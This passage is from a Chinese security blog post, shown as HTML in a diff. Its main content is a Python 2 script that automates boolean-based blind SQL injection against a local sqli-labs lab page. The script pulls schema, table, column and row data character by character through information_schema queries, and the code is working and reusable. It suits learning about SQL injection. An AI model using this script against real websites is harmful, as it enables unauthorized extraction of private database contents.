class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding( &quot;utf-8&quot; )</span><br><span class="line"></span><br><span class="line">def qingqiu(url1,url2):</span><br><span class="line"></span><br><span class="line">    html1 = requests.get(url1)</span><br><span class="line">    html2 = requests.get(url2)</span><br><span class="line">    if html1.text != html2.text:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chahangshu(url,url1,url2,url3):</span><br><span class="line">    global jieduan</span><br><span class="line">    print &quot;1111111&quot;</span><br><span class="line">    print url1,url2,url3</span><br><span class="line">    url = url + &quot;&#123;&#125; &quot;.format(jieduan[0])+ &quot;and (&quot; + url1 + &quot; count(&#123;&#125;) &quot;.format(url2)+ url3 + &quot;)&quot;</span><br><span class="line">    print url</span><br><span class="line">    for i in range(0,29):</span><br><span class="line">        url_i1 = url + &quot; &gt; &#123;&#125;&quot;.format(i) + &quot; &#123;&#125;&quot;.format(jieduan[1])</span><br><span class="line">        url_i2 = url + &quot; &gt; &#123;&#125;&quot;.format(i+1) + &quot; &#123;&#125;&quot;.format(jieduan[1])</span><br><span class="line">        jieguo = qingqiu(url_i1,url_i2)</span><br><span class="line">        if jieguo:</span><br><span class="line">            return i+1</span><br><span class="line"></span><br><span class="line">def chazifushu(url,url_chashuzi,hangshu):</span><br><span class="line">    global jieduan</span><br><span class="line">    url1 = url + jieduan[0] + &quot; and length((&quot; + url_chashuzi</span><br><span class="line">    list = []</span><br><span class="line">    for i in range(hangshu):</span><br><span class="line">        url2 = url1 + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;))&quot;</span><br><span class="line">        for j in range(0,50):</span><br><span class="line">            url3_1 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j) + jieduan[1]</span><br><span class="line">            url3_2 = url2 + &quot; &gt; &#123;&#125; &quot;.format(j+1) + jieduan[1]</span><br><span class="line">            jieguo = qingqiu(url3_1, url3_2)</span><br><span class="line">            if jieguo:</span><br><span class="line">                print &quot;第&#123;&#125;行字符长度为：&#123;&#125;字符&quot;.format(i+1,j+1)</span><br><span class="line">                list.append(j+1)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">    return list</span><br><span class="line">            # print url3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chashuzhi(url,url_chashuzi,hangshu,zifushu):</span><br><span class="line">    global jieduan</span><br><span class="line"></span><br><span class="line">    list = []</span><br><span class="line">    qingqiuURL = url + jieduan[0] + &quot; and ascii(mid((&quot; + url_chashuzi</span><br><span class="line">    for i in range(hangshu):</span><br><span class="line">        qingqiuURLi = qingqiuURL + &quot; limit &#123;&#125;,1&quot;.format(i) + &quot;),&quot;</span><br><span class="line">        flag = &quot;&quot;</span><br><span class="line">        # print qingqiuURLi</span><br><span class="line">        for j in range(zifushu[i]):</span><br><span class="line">            qingqiuURLj = qingqiuURLi + &quot;&#123;&#125;,1)) &gt; &quot;.format(j+1)</span><br><span class="line">            # print qingqiuURLj</span><br><span class="line">            for m in range(33,127):</span><br><span class="line">                qingqiuURLm1 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m) + jieduan[1]</span><br><span class="line">                qingqiuURLm2 = qingqiuURLj + &quot; &#123;&#125; &quot;.format(m+1) + jieduan[1]</span><br><span class="line">                jieguo = qingqiu(qingqiuURLm1,qingqiuURLm2)</span><br><span class="line">                # print qingqiuURLm</span><br><span class="line">                if jieguo:</span><br><span class="line">                    print chr(m+1),</span><br><span class="line">                    # print qingqiuURLm2</span><br><span class="line">                    flag+= chr(m+1)</span><br><span class="line">                    # list.append(chr(m+1))</span><br><span class="line">                    break</span><br><span class="line">                    print flag</span><br><span class="line"></span><br><span class="line">        list.append(flag)</span><br><span class="line">        print list</span><br><span class="line"></span><br><span class="line">    return list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def chaschema_name(url):</span><br><span class="line">    url_schema1 = &quot;select&quot;</span><br><span class="line">    url_schema2 = &quot;schema_name&quot;</span><br><span class="line">    url_schema3 = &quot;from information_schema.schemata&quot;</span><br><span class="line">    url_schema = url_schema1 + &quot; &quot;+ url_schema2 + &quot; &quot; + url_schema3</span><br><span class="line">    hangshu = chahangshu(url,url_schema1,url_schema2,url_schema3)</span><br><span class="line">    print &quot;一共有&#123;&#125;个数据库&quot;.format(hangshu)</span><br><span class="line">    # # hangshu = 5</span><br><span class="line">    zifushu = chazifushu(url, url_schema, hangshu)</span><br><span class="line">    print zifushu</span><br><span class="line"></span><br><span class="line">    listhang = chashuzhi(url,url_schema,hangshu,zifushu)</span><br><span class="line">    # print &quot;------&quot;</span><br><span class="line">    print listhang</span><br><span class="line">    # print &quot;------&quot;</span><br><span class="line">    return listhang</span><br><span class="line"></span><br><span class="line">def chatable_name(url,schema_name):</span><br><span class="line">    url_table1 = &quot;select&quot;</span><br><span class="line">    url_table2 = &quot;table_name&quot;</span><br><span class="line">    url_table3 = &quot;from information_schema.tables where table_schema = &apos;&#123;&#125;&apos;&quot;.format(schema_name)</span><br><span class="line">    url_table = url_table1 + &quot; &quot; + url_table2 + &quot; &quot; + url_table3</span><br><span class="line">    hangshu = chahangshu(url, url_table1, url_table2, url_table3)</span><br><span class="line">    print &quot;&#123;&#125;库一共有&#123;&#125;张表&quot;.format(schema_name,hangshu)</span><br><span class="line">    zifushu = chazifushu(url, url_table, hangshu)</span><br><span class="line">    print zifushu</span><br><span class="line">    listhang = chashuzhi(url, url_table, hangshu, zifushu)</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    print listhang</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    return listhang</span><br><span class="line"></span><br><span class="line">def chacolumn_name(url,schema_name,table_name):</span><br><span class="line">    url_column1 = &quot;select&quot;</span><br><span class="line">    url_column2 = &quot;column_name&quot;</span><br><span class="line">    url_column3 = &quot;from information_schema.columns where table_schema = &apos;&#123;&#125;&apos; and table_name = &apos;&#123;&#125;&apos;&quot;.format(schema_name,table_name)</span><br><span class="line">    url_column = url_column1 + &quot; &quot; + url_column2 + &quot; &quot; + url_column3</span><br><span class="line">    # print url_column</span><br><span class="line">    hangshu = chahangshu(url, url_column1, url_column2, url_column3)</span><br><span class="line">    print &quot;&#123;&#125;表一共有&#123;&#125;个字段&quot;.format(table_name,hangshu)</span><br><span class="line">    zifushu = chazifushu(url, url_column, hangshu)</span><br><span class="line">    print &quot;***&quot;</span><br><span class="line">    print zifushu</span><br><span class="line">    listhang = chashuzhi(url, url_column, hangshu, zifushu)</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    print listhang</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    return listhang</span><br><span class="line"></span><br><span class="line">def cha_shuju(url, schema_name,table_name,column_name):</span><br><span class="line">    url_shuzhi1 = &quot;select&quot;</span><br><span class="line">    url_shuzhi2 = &quot;&#123;&#125;&quot;.format(column_name)</span><br><span class="line">    url_shuzhi3 = &quot;from &#123;&#125;.&#123;&#125;&quot;.format(schema_name,table_name)</span><br><span class="line"></span><br><span class="line">    url_shuzhi = url_shuzhi1 + &quot; &quot; + url_shuzhi2 + &quot; &quot; + url_shuzhi3</span><br><span class="line">    # print url_column</span><br><span class="line">    hangshu = chahangshu(url, url_shuzhi1, url_shuzhi2, url_shuzhi3)</span><br><span class="line">    print &quot;&#123;&#125;库&#123;&#125;表&#123;&#125;字段一共有&#123;&#125;行&quot;.format(schema_name,table_name,column_name, hangshu)</span><br><span class="line">    zifushu = chazifushu(url, url_shuzhi, hangshu)</span><br><span class="line">    print &quot;***&quot;</span><br><span class="line">    print zifushu</span><br><span class="line">    listhang = chashuzhi(url, url_shuzhi, hangshu, zifushu)</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    print listhang</span><br><span class="line">    print &quot;------&quot;</span><br><span class="line">    return listhang</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    global zifu,jieduan</span><br><span class="line">    jieduan = [&apos;\&apos;&apos;,&apos;-- |&apos;]</span><br><span class="line">    url = &quot;http://192.168.107.128/sqli/Less-8/?id=1&quot;</span><br><span class="line">    schema_name = chaschema_name(url)</span><br><span class="line">    print &quot;一共有如下表&#123;&#125;&quot;.format(schema_name)</span><br><span class="line">    zhiding_schema = raw_input(&quot;请输入要查询的库名&quot;)</span><br><span class="line">    # zhiding_schema = &apos;security&apos;</span><br><span class="line">    # schema_name = [&apos;information_schema&apos;, &apos;challenges&apos;, &apos;mysql&apos;, &apos;performance_schema&apos;, &apos;security&apos;]</span><br><span class="line">    i =1</span><br><span class="line">    while (i):</span><br><span class="line">        for i in schema_name:</span><br><span class="line">            print i,zhiding_schema</span><br><span class="line">            if zhiding_schema == i:</span><br><span class="line">                table_name = chatable_name(url, zhiding_schema)</span><br><span class="line">                print &quot;&#123;&#125;库有如下表&#123;&#125;&quot;.format(zhiding_schema,table_name)</span><br><span class="line">                i =0</span><br><span class="line">                break</span><br><span class="line">        if(i ==1):</span><br><span class="line">            zhiding_schema = input(&quot;不存在此库，请检查是否输入错误&quot;)</span><br><span class="line"></span><br><span class="line">    zhiding_table = raw_input(&quot;请输入要查询的表名&quot;)</span><br><span class="line">    # # print zhiding_table</span><br><span class="line">    # table_name = [&apos;emails&apos;, &apos;referers&apos;, &apos;uagents&apos;, &apos;users&apos;]</span><br><span class="line">    # zhiding_table = &quot;emails&quot;</span><br><span class="line">    i = 1</span><br><span class="line">    while (i):</span><br><span class="line">        for i in table_name:</span><br><span class="line">            print i, zhiding_table</span><br><span class="line">            if zhiding_table == i:</span><br><span class="line">                columns_name = chacolumn_name(url, zhiding_schema,zhiding_table)</span><br><span class="line">                i = 0</span><br><span class="line">                print &quot;&#123;&#125;表有如下字段&#123;&#125;&quot;.format(zhiding_table,columns_name)</span><br><span class="line">                break</span><br><span class="line">        if(i == 1):</span><br><span class="line">            zhiding_table = input(&quot;不存在此表，请检查是否输入错误&quot;)</span><br><span class="line"></span><br><span class="line">    zhiding_column = raw_input(&quot;请输入要查询的字段&quot;)</span><br><span class="line">    # # print zhiding_column</span><br><span class="line">    # columns_name = [&apos;id&apos;, &apos;email_id&apos;]</span><br><span class="line">    # zhiding_table = &quot;emails&quot;</span><br><span class="line">    i = 1</span><br><span class="line">    while (i):</span><br><span class="line">        for i in columns_name:</span><br><span class="line">            print i, zhiding_column</span><br><span class="line">            if zhiding_column == i:</span><br><span class="line">                shuju_name = cha_shuju(url, zhiding_schema, zhiding_table,zhiding_column)</span><br><span class="line">                print &quot;&#123;&#125;字段数值有&#123;&#125;&quot;.format(zhiding_column,shuju_name)</span><br><span class="line">                i = 0</span><br><span class="line">                break</span><br><span class="line">        if (i == 1):</span><br><span class="line">            zhiding_table = input(&quot;不存在此字段，请检查是否输入错误&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-09-08T02:51:45.275Z" itemprop="dateUpdated">2019-09-08 10:51:45</time>
+</span>
+
+
+        
+        原文链接：<a href="/2019/09/08/mysql报错注入/" target="_blank" rel="external">https://0xxk.github.io/2019/09/08/mysql报错注入/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://0xxk.github.io'">
+            <img src="/img/avatar.jpg" alt="0xxk">
+            <a>0xxk</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/09/08/mysql报错注入/&title=《MYSQL注入之布尔盲注》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/09/08/mysql报错注入/&title=《MYSQL注入之布尔盲注》 — oxxk blog&source=学习sql盲注的过程" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/09/08/mysql报错注入/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《MYSQL注入之布尔盲注》 — oxxk blog&url=https://0xxk.github.io/2019/09/08/mysql报错注入/&via=https://0xxk.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/09/08/mysql报错注入/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/09/08/sqlmap常规注入操作/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：SQLMAP注入
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/09/07/python脚本之报错注入函数检测/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：python脚本之报错注入函数检测">下一篇：python脚本之报错注入函数检测</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2017
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://0xxk.github.io">tomotoes.com</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://0xxk.github.io/2019/09/08/mysql报错注入/&title=《MYSQL注入之布尔盲注》 — oxxk blog&pic=https://0xxk.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://0xxk.github.io/2019/09/08/mysql报错注入/&title=《MYSQL注入之布尔盲注》 — oxxk blog&source=学习sql盲注的过程" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://0xxk.github.io/2019/09/08/mysql报错注入/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《MYSQL注入之布尔盲注》 — oxxk blog&url=https://0xxk.github.io/2019/09/08/mysql报错注入/&via=https://0xxk.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://0xxk.github.io/2019/09/08/mysql报错注入/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJ0lEQVR42u3ay27DMAxE0fz/T6vbAIHlGY5cwOTVqkjsWMcLVnx8PvJaX+vU9b/XuE+xFwwYMF7LWNu1v+b726tf3m9x/2vK3mDAgDGHoWxC2dyet99K7QXBgAEDhs7Y/04efGHAgAFDZ+zv1QNuLWTDgAFjMkNPU/VjYh5MH8nFYcCA8UKGXnX//78f6W/AgAHjVYxlLjeA6iFyBQsGDBi9GXqAczfkjmK4ARcGDBhzGEmAS4K1XrCTPoEBA0Zrxj6Y6oFPaUwqz9LbDJf/N2DAgNGU4Y5T6NtyRyuSAQ4YMGD0Zpw90rmlugNZOAwYMFozknGHpAznDnPcUGHAgDGGoW9XD51JmmqAYcCA0ZqRb0h/sJKU1o6hMGDAmMDQW4Z64HuiInhzLwwYMMYw9KEKJQ02jnSlz2HAgDGNoZTM8i26zQNjsAMGDBitGUppvhYWz4bjAzMjMGDAeCEjOaK5LclaqJVSWRgwYLRm5GFUB7ivw22mwoABozcjGeoy3pOwlHB8+YphwIAxgOEezvS2gXvUc++CAQPGNEbSdHTLZO69N0+EAQNGU8Yyl57i6mU1vaB2k3/DgAGjKSNJL5OjpFvOM4YtYMCA0ZThppF58K0F3GKtDgYMGI0YboJaazeeTWJhwIABIznw1VLlfYp7YFoEBgwYwxi1gQw3PY46sTBgwGjH0A957oNrR0zlFcOAAWMOo5Y6ukU0vdBfaxXAgAGjKeMPM4dBzwHD0DUAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2017/10/11");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "0xxk");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
